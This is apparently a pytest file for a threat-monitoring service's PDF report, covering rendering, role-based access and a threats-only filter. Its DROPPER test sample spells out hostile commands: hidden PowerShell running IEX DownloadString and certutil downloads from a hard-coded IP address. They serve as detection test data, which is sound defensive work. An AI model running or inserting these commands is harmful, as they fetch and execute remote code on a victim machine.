"""Threat monitoring PDF report."""

import io
from datetime import datetime, timezone

from fastapi.testclient import TestClient

from app.main import app
from app.modules.reports.threat_pdf import render_threat_monitoring_pdf
from app.modules.threat_monitoring.schemas import Detection, ThreatStats, TimelineBucket

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)
CLEAN = b"hello, this is a plain and boring text file " * 20


def _headers(email: str = "analyst@local") -> dict[str, str]:
    token = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {token}"}


def _stats() -> ThreatStats:
    return ThreatStats(
        total_detections=2,
        malicious=1,
        suspicious=0,
        benign=1,
        open_alerts=0,
        last_24h=2,
        detection_rate=0.5,
        by_level={"high": 1, "low": 1},
        by_family=[{"family": "Dropper", "count": 1}],
    )


def _timeline() -> list[TimelineBucket]:
    now = datetime.now(timezone.utc)
    return [
        TimelineBucket(bucket=now, label="10:00", total=2, malicious=1, suspicious=0, benign=1),
    ]


def test_render_includes_snapshot_and_filtered_rows():
    pdf = render_threat_monitoring_pdf(
        stats=_stats(),
        timeline=_timeline(),
        detections=[
            Detection(
                id="1",
                at=datetime.now(timezone.utc),
                sha256="a" * 64,
                filename="rpt-drop.bin",
                verdict_label="malicious",
                score=90,
                level="high",
                family="Dropper",
            )
        ],
        window="24h",
        filter_notes=["Threats only (benign excluded)"],
        prepared_by="analyst@local",
        role="Security Analyst",
        matched_count=1,
    )
    assert pdf.startswith(b"%PDF")
    assert b"Threat monitoring report" in pdf
    assert b"rpt-drop.bin" in pdf
    assert b"Dropper" in pdf


def test_render_empty_filters_still_produces_pdf():
    pdf = render_threat_monitoring_pdf(
        stats=ThreatStats(
            total_detections=0,
            malicious=0,
            suspicious=0,
            benign=0,
            open_alerts=0,
            last_24h=0,
        ),
        timeline=[],
        detections=[],
        window="7d",
        filter_notes=["None — full detection log"],
        prepared_by="admin@local",
        role="Administrator",
        matched_count=0,
    )
    assert pdf.startswith(b"%PDF")
    assert b"No detections match" in pdf


def test_report_requires_monitoring_role():
    assert client.get("/api/v1/threats/report").status_code == 401
    denied = client.get("/api/v1/threats/report", headers=_headers("researcher@local"))
    assert denied.status_code == 403


def test_report_pdf_respects_threats_only_filter():
    analyst = _headers("analyst@local")
    client.post(
        "/api/v1/files/upload",
        files={"file": ("rpt-drop.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=analyst,
    )
    client.post(
        "/api/v1/files/upload",
        files={"file": ("rpt-clean.txt", io.BytesIO(CLEAN), "text/plain")},
        headers=analyst,
    )

    for email in ("analyst@local", "admin@local", "soc@local"):
        response = client.get(
            "/api/v1/threats/report",
            params={"window": "24h", "threats_only": True, "q": "rpt-"},
            headers=_headers(email),
        )
        assert response.status_code == 200
        assert response.headers["content-type"] == "application/pdf"
        assert response.content.startswith(b"%PDF")

    filtered = client.get(
        "/api/v1/threats/report",
        params={"window": "30d", "threats_only": True, "q": "rpt-"},
        headers=analyst,
    )
    assert b"rpt-clean.txt" not in filtered.content
    assert b"rpt-drop.bin" in filtered.content
